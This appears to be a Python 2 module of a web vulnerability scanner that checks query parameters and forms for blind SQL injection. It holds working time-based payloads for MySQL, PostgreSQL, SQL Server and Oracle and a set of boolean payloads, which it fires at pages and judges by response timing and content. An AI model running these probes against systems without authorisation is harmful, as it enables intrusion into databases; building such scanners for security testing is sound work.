from utils import update_url_params, request_params, get_url_host, get_url_query, get_form_params, compare, POST, GET
from urlparse import urlparse, urljoin, parse_qsl
from client import NotAPage, RedirectedToExternal

import copy

#(select(0)from(select(sleep({0})))v)/*'+(select(0)from(select(sleep({0})))v)+'\"+(select(0)from(select(sleep({0})))v)+\"*/
TIME_INJECTIONS = {
    "MySQL": ("(select(0)from(select(sleep({0})))v)/*'+(select(0)from(select(sleep({0})))v)+'\"+(select(0)from(select(sleep({0})))v)+\"*/", "if(now()=sysdate(),sleep({0}),0)/*'XOR(if(now()=sysdate(),sleep({0}),0))OR'\"XOR(if(now()=sysdate(),sleep({0}),0))OR\"*/",),
    "PostgreSQL": (";SELECT pg_sleep({0})--", ");SELECT pg_sleep({0})--", "';SELECT pg_sleep({0})--", "');SELECT pg_sleep({0})--", "));SELECT pg_sleep({0})--", "'));SELECT pg_sleep({0})--", "SELECT pg_sleep({0})--"),
    "Microsoft SQL Server": ("; WAIT FOR DELAY '00:00:{0}'",),
    "Oracle": ("BEGIN DBMS_LOCK.SLEEP({0}); END;",),
}

BOOLEAN_INJECTIONS = {
    " AND 3*2*1=6 AND 119=119": True,
    " AND 3*2*2=6 AND 119=119": False,
    " AND 3*2*1=6 AND 119=118": False,
    " AND 5*4=20 AND 119=119": True,
    " AND 5*4=21 AND 119=119": False,
    " AND 7*7>48 AND 119=119": True
}

BOOL_TEST_COUNT = len(BOOLEAN_INJECTIONS)

def sql_blind(page, client):
    print "Testing for SQL Blind in page {}".format(page.url)

    if urlparse(page.url).query:
        time_based_blind(client, page.url, method=GET)
        boolean_blind(client, page)

    for form in page.get_forms():
        action = urljoin(page.url, form.get('action'))

        if get_url_host(page.url) != get_url_host(action):
            continue

        method = form.get('method') or GET
        params = get_form_params(form)

        time_based_blind(client, action, method, params)


def boolean_blind(client, page):
    page_content = list(page.document.stripped_strings)
    url = page.url
    query = get_url_query(url)

    for param, value in query.iteritems():
        successed = 0
        for payload, is_correct in BOOLEAN_INJECTIONS.iteritems():
            injected_action = update_url_params(url, {param: value + payload})
            try:
                res_page = client.get(injected_action)
                if is_correct == compare(page_content, list(res_page.document.stripped_strings)):
                    successed += 1
            except NotAPage:
                continue
            except RedirectedToExternal:
                continue

        if successed == BOOL_TEST_COUNT:
            print 'SQL blind (boolean) in param {}'.format(param)


def time_based_blind(client, action, method, params=None):
    report = {}
    if params:
        injectable, immutable = params
    else:
        injectable, immutable = {}, {}

    query = get_url_query(action)

    for param, value in query.iteritems():
        for db, injections in TIME_INJECTIONS.iteritems():
            for inj in injections:
                successed = []
                for t in xrange(0, 10, 3):
                    payload = inj.format(t)

                    injected_action = update_url_params(action, {param: payload})

                    injected_params = copy.deepcopy(injectable)
                    injected_params.update(immutable)

                    try:
                        req_time = request_params(client, injected_action, method, injected_params).response.elapsed.total_seconds()
                        successed.append([t, req_time])
                    except NotAPage:
                        continue
                    except RedirectedToExternal:
                        continue

                if successed and all(t <= rt for t, rt in successed):
                    print 'SQL blind db {} in form {} param {} injection {}'.format(db, action, urlparse(action).query, payload)


    for param in injectable.keys():
        for db, injections in TIME_INJECTIONS.iteritems():
            for inj in injections:
                successed = []
                for t in xrange(0, 10, 3):
                    payload = inj.format(t)

                    injected_params = inject_param(injectable, param, payload)
                    injected_params.update(immutable)

                    try:
                        req_time = request_params(client, action, method, injected_params).response.elapsed.total_seconds()
                        successed.append([t, req_time])
                    except NotAPage:
                        continue
                    except RedirectedToExternal:
                        continue

                if successed and all(t <= rt for t, rt in successed):
                    print 'SQL blind db {} in form {} param {} injection {}'.format(db, action, param, payload)


def inject_param(parameters, param, injection):
    injected = copy.deepcopy(parameters)
    injected[param] = injection
    return injected
